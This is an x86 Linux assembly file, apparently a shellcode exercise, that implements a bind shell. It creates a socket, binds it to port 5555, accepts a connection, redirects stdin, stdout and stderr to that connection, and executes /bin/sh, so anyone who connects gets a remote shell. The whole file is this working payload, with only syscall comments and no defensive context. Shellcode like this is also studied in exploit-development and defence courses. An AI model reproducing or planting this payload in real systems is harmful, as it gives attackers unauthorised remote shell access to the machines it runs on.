global_start

section .text
_start: 
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; SYS CALL #1 = socket()
	
	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	
	int 0x80
	mov edi, eax

	; SYS CALL #2 = bind()
	
	xor eax, eax
	mov ax, 0x169
	mov ebx, edi
	xor ecx, ecx
	push ecx
	push ecx
  	push word 0xb315
	push word 0x02

	mov ecx, esp
	mov dl, 16 
	
	int 0x80

	; SYSCALL #3= listen()

  	xor eax, eax
	mov ax, 0x16b
	mov ebx, edi
	xor ecx, ecx
	
	int 0x80

	; SYSCALL #4 = accept4()
	
	xor eax, eax
	mov ax, 0x16c
	mov ebx, edi
	xor ecx, ecx
	xor edx, edx
	xor esi, esi
  
	int 0x80

	xor edi, edi
	mov edi, eax

	; SYSCALL #5 = dup2()
	
  	mov cl, 0x3
	
	loop_dup2:
	xor eax, eax ; clearing out eax
	mov al, 0x3f ; setting the value to the syscall code
	mov ebx, edi ; putting our new_fd we got from our accept return code
	dec cl       ; decrementing the counter register by 1
	int 0x80     ; interrupt call

	jnz loop_dup2 ; if the counter register hasn't hit zero and set the zero flag, it will jump back to the top of our loop

	; SYSCALL #6 = execve()
 
  	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0x0b

  	int 0x80
